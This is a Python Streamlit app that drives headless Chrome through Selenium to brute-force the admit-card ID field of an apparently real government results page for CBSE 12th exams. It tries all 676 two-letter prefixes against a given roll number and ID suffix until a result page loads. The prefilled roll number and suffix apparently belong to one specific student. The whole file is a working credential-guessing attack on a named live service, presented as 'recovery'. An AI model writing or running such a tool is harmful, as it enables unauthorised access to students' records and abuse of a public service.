import streamlit as st
import os
import time
import string
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException

# ========================= CONFIGURATION =========================
URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"

def get_driver():
    """Sets up a lean, headless Chrome instance for Render."""
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1280,720")
    options.add_argument("--blink-settings=imagesEnabled=false")
    
    # Path where render-build.sh installs Chrome
    render_bin = "/opt/render/project/src/.render/chrome/opt/google/chrome/google-chrome"
    if os.path.exists(render_bin):
        options.binary_location = render_bin
        
    # Selenium 4.10+ will automatically find the matching v148 driver
    return webdriver.Chrome(options=options)

def is_success(driver):
    """Your logic: Returns True if result is shown (no error)"""
    try:
        # 1. Look for error message
        try:
            error_elem = driver.find_element(By.ID, "err_msg")
            if error_elem.is_displayed() and error_elem.text.strip():
                return False
        except NoSuchElementException:
            pass 
        
        # 2. Check for success indicators in page source
        success_indicators = ["marks", "result", "subject", "grade", "total"]
        page_text = driver.page_source.lower()
        if any(ind in page_text for ind in success_indicators):
            return True
            
        # 3. Check for URL changes
        if "result" in driver.current_url.lower() and "error" not in driver.current_url.lower():
            return True
            
    except Exception:
        pass
    return False

# ========================= STREAMLIT UI =========================
st.set_page_config(page_title="Admit ID Recovery", page_icon="🎓", layout="centered")

# Custom CSS for a better look - Fixed parameter name here
st.markdown("""
    <style>
    .main { background-color: #f5f7f9; }
    .stButton>button { width: 100%; border-radius: 5px; height: 3em; background-color: #ff4b4b; color: white; }
    .stTextInput>div>div>input { border-radius: 5px; }
    </style>
    """, unsafe_allow_html=True)

st.title("🎓 CBSE 12th Admit ID Recovery")
st.info("Automated recovery of Admit Card IDs using alphabetical prefix testing.")

# Input Layout
col1, col2 = st.columns(2)
with col1:
    roll_val = st.text_input("Roll Number", value="18615899")
with col2:
    suffix_val = st.text_input("Last 6 Characters", value="994511")

delay_val = st.slider("Delay per attempt (Seconds)", 0.2, 3.0, 0.5)

if st.button("🚀 Start Brute Force"):
    status_log = st.empty()
    progress_bar = st.progress(0)
    
    driver = None
    try:
        driver = get_driver()
        driver.get(URL)
        
        letters = string.ascii_uppercase
        combos = [f"{a}{b}" for a in letters for b in letters]
        total = len(combos)
        
        with st.status("Initializing...", expanded=True) as status:
            for i, prefix in enumerate(combos):
                code = f"{prefix}{suffix_val}"
                status.update(label=f"Testing Prefix: **{prefix}** ({i+1}/{total})")
                progress_bar.progress((i + 1) / total)
                
                try:
                    # Clear and fill fields
                    driver.find_element(By.ID, "rroll").clear()
                    driver.find_element(By.ID, "rroll").send_keys(roll_val)
                    
                    driver.find_element(By.ID, "admn_id").clear()
                    driver.find_element(By.ID, "admn_id").send_keys(code)
                    
                    driver.find_element(By.ID, "submit").click()
                    
                    time.sleep(delay_val)
                    
                    if is_success(driver):
                        status.update(label="✅ Match Found!", state="complete")
                        st.balloons()
                        st.success(f"### 🎉 Success!\n**Prefix:** {prefix}\n**Full Code:** `{code}`")
                        st.code(code, language="text")
                        break
                        
                except Exception:
                    continue 
            else:
                status.update(label="❌ Finished with no success", state="error")
                st.warning("All 676 combinations exhausted.")

    except Exception as e:
        st.error(f"Critical System Error: {e}")
    finally:
        if driver:
            driver.quit()
